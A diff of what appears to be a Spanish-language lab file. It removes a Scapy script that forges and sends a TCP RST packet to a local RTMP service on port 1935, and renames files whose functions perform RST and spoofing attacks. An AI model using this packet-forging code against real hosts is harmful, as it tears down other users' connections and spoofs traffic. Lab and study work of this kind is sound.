@@ -149,20 +149,7 @@ print("\n[+] Inyeccion completada. Analiza en Wireshark.")
 
 
 ```
-- mod1_rst_real.py
-
-```
-from scapy.all import *
-
-ip = IP(src="127.0.0.1", dst="127.0.0.1")
-tcp = TCP(sport=46404, dport=1935, flags="R", seq=123456789)  # Reemplazar seq
-pkt = ip/tcp
-
-send(pkt)
-print("Paquete RST enviado.")
-
-```
-- mod1_auto.py
+- mod1.py
 ```
 from scapy.all import *
 import time
@@ -202,7 +189,7 @@ def send_rst_attack():
 send_rst_attack()
 ```
 
-- mod2_spoof.py
+- mod2.py
 
 
 ```
@@ -246,7 +233,7 @@ def send_spoofed_packets():
 send_spoofed_packets()
 
 ```
-- mod3_seq.py
+- mod3.py
 
 ```
 from scapy.all import *
